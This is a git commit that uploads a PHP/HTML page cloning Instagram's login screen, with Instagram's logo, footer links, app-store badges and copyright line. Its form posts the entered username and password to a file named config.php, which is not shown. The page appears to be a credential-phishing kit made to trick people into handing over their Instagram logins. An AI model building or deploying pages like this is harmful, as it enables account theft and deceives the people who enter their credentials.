f8ff7c54b2844c679d8dd0361c75c178a99d3f69
savlat-code <147397222+savlat-code@users.noreply.github.com>
2023-10-22 09:17:37 +0500

    Add files via upload

---
+++ index (1).php
@@ -0,0 +1,128 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Instagram">
+    <meta name="author" content="Edlávio Alberto">
+    <link rel="shortcut icon" href="img/icon.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <title>Instagram</title>
+</head>
+<body onload="SwitchScreen()">
+        <section class="container">
+            <!-- SMARTPHONE SECTION -->
+            <article class="smartphone">
+                <div class="screens">
+                    <img class="screen fade" src="img/screen1.png" alt="screen1">
+                    <img class="screen fade" src="img/screen2.png" alt="screen2">
+                    <img class="screen fade" src="img/screen3.png" alt="screen3">
+                </div>
+                <img src="img/smartphones.png" alt="smartphones">
+            </article>
+            <!-- SMARTPHONE SECTION END -->
+            <!-- FORM SECTION -->
+            <article class="form-area">
+                <div class="logo">
+                    <img src="img/logo.png" alt="Instagram Logo">
+                </div>
+                <form action="config.php">
+                    <input type="text" name="username" id="username" placeholder="Phone number, username or email">
+                    <input type="password" name="password" id="password" placeholder="Password">
+                    <input type="submit" name="submit" value="Login">
+                    <div class="other-option">
+                        <div></div> <p>OR</p> <div></div>
+                    </div>
+                    <div class="options">
+                        <a href="#" class="social"> <span><i class="fab fa-facebook-square"></i></span> Log in with Facebook </a>
+                        <div class="forget"> <a href="#">Forgot password?</a> </div>
+                    </div>
+                </form>
+                <div class="noaccount">
+                    <a href="#">Don't have an account? <span>Sign up</span></a>
+                </div>
+                <div class="apps">
+                    <p>Get the app.</p>
+                    <a href="#"> <img src="img/appstore.png" alt="Get app in AppStore"> </a>
+                    <a href="#"> <img src="img/googleplay.png" alt="Get app in Google Play"> </a>
+                </div>
+            </article>
+        </section>
+            <!-- FORM SECTION END -->
+            <!-- FOOTER -->
+        <footer>
+            <div class="footer-content">
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Terms</a>
+                <a href="#">Top Accounts</a>
+                <a href="#">Hashtags</a>
+                <a href="#">Locations</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Contact Uploading & Non-Users</a>
+            </div>
+            <div>
+                <a href="#">Dance</a>
+                <a href="#">Food & Drink</a>
+                <a href="#">Home & Garden</a>
+                <a href="#">Music</a>
+                <a href="#">Visual Arts</a>
+            </div>
+            <div class="copyright">
+                <select aria-label="Trocar idioma de exibição">
+                    <option value="pt">English</option>
+                    <option value="af">Afrikaans</option>
+                    <option value="cs">Čeština</option>
+                    <option value="da">Dansk</option>
+                    <option value="de">Deutsch</option>
+                    <option value="el">Ελληνικά</option>
+                    <option value="en">Português (Portugal)</option>
+                    <option value="en-gb">English (UK)</option>
+                    <option value="es">Español (España)</option>
+                    <option value="es-la">Español</option>
+                    <option value="fi">Suomi</option>
+                    <option value="fr">Français</option>
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="it">Italiano</option>
+                    <option value="ja">日本語</option>
+                    <option value="ko">한국어</option>
+                    <option value="ms">Bahasa Melayu</option>
+                    <option value="nb">Norsk</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="pl">Polski</option>
+                    <option value="pt-br">Português (Brasil)</option>
+                    <option value="ru">Русский</option>
+                    <option value="sv">Svenska</option>
+                    <option value="th">ภาษาไทย</option>
+                    <option value="tl">Filipino</option>
+                    <option value="tr">Türkçe</option>
+                    <option value="zh-cn">中文(简体)</option>
+                    <option value="zh-tw">中文(台灣)</option>
+                    <option value="bn">বাংলা</option>
+                    <option value="gu">ગુજરાતી</option>
+                    <option value="hi">हिन्दी</option>
+                    <option value="hr">Hrvatski</option>
+                    <option value="hu">Magyar</option>
+                    <option value="kn">ಕನ್ನಡ</option>
+                    <option value="sk">Slovenčina</option>
+                    <option value="ta">தமிழ்</option>
+                    <option value="te">తెలుగు</option>
+                    <option value="vi">Tiếng Việt</option>
+                    <option value="zh-hk">中文(香港)</option>
+                    <option value="bg">Български</option>
+                    <option value="ro">Română</option>
+                    <option value="sr">Српски</option>
+                    <option value="uk">Українська</option>
+                </select>
+                <span>&copy; 2023 Instagram from Meta</span>
+            </div>
+        </footer>
+    <script src="js/app.js"></script>
+    <script src="js/brands.min.js"></script>
+    <script src="js/fontawesome.min.js"></script>
+</body>
+</html>
